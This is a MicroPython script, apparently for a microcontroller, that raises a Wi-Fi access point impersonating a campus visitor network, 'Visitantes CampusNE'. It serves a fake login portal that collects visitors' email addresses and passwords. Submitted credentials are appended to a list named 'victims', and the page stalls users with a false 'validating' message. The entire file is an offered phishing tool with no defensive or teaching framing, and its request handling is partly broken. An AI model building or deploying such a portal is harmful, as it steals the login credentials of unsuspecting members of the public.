import network
import socket
import time
import ure

# Configurações do ponto de acesso
SSID_NAME = "Visitantes CampusNE"
PASSWORD = "12345678"
AP_IP = "172.0.0.1"
SUBNET_MASK = "255.255.255.0"

# HTML para as páginas
SUBTITLE = "Bem vindo, Bom evento!"
TITLE = "Login:"
BODY = "Digite seu e-mail e abra as portas para um novo mundo de possibilidades!"
POST_TITLE = "Redirecionando..."
POST_BODY = "<span style='color:red;'>Estamos validando o seu e-mail. Aguarde 3 minutos.<br>Obrigado.</span>"
PASS_TITLE = "Tesouro"
CLEAR_TITLE = "Cleared"

victims = []

# Configuração do ponto de acesso
ap = network.WLAN(network.AP_IF)
ap.active(True)
ap.config(essid=SSID_NAME, password=PASSWORD)
ap.ifconfig((AP_IP, AP_IP, SUBNET_MASK, SUBNET_MASK))
print('Ponto de acesso iniciado com o IP:', ap.ifconfig())

# Função para servir uma página HTML
def serve_page(client, content):
    client.send("HTTP/1.1 200 OK\r\n")
    client.send("Content-Type: text/html\r\n")
    client.send("Connection: close\r\n\r\n")
    client.sendall(content)
    client.close()

# Função para redirecionar
def redirect(client):
    client.send("HTTP/1.1 302 Found\r\n")
    client.send("Location: http://%s/\r\n" % AP_IP)
    client.send("Connection: close\r\n\r\n")
    client.close()

# Página de login (index)
def index_page():
    html = f"""
    <html>
    <head><title>{SSID_NAME} - {TITLE}</title></head>
    <body>
    <header>
    <h1>{SSID_NAME}</h1><p>{SUBTITLE}</p>
    </header>
    <div>
    <form action="/post" method="post">
        <label>E-mail:</label><input type="text" name="username"><br>
        <label>Senha:</label><input type="password" name="password"><br>
        <input type="submit" value="Login">
    </form>
    </div>
    </body>
    </html>
    """
    return html

# Página de pós-login
def post_page(username, password):
    victims.append((username, password))
    html = f"""
    <html>
    <head><title>{POST_TITLE}</title></head>
    <body>
    <header>
    <h1>{POST_TITLE}</h1>
    <p>{POST_BODY}</p>
    </header>
    </body>
    </html>
    """
    return html

# Inicia servidor socket
def start_server():
    addr = socket.getaddrinfo(AP_IP, 80)[0][-1]
    s = socket.socket()
    s.bind(addr)
    s.listen(5)
    print('Servidor escutando em', addr)

    while True:
        cl, addr = s.accept()
        print('Cliente conectado de', addr)
        request = cl.recv(1024)
        request = str(request)
        
        # Usamos regex para capturar o caminho da URL
        match = ure.search(r'GET\s(\/\S*)\s', request)
        if match:
            path = match.group(1)
            print('Caminho solicitado:', path)

            # Se o caminho for "/", servir a página de login
            if path == "/":
                html = index_page()
                serve_page(cl, html)
            elif path == "/post":
                # Captura username e password via POST
                username = request.split("username=")[1].split("&")[0]
                password = request.split("password=")[1].split(" ")[0]
                username = username.replace("+", " ")
                password = password.replace("+", " ")
                html = post_page(username, password)
                serve_page(cl, html)
            else:
                # Redirecionar qualquer outra requisição para a página de login
                redirect(cl)
        else:
            # Redirecionar caso não consiga ler o caminho
            redirect(cl)

start_server()
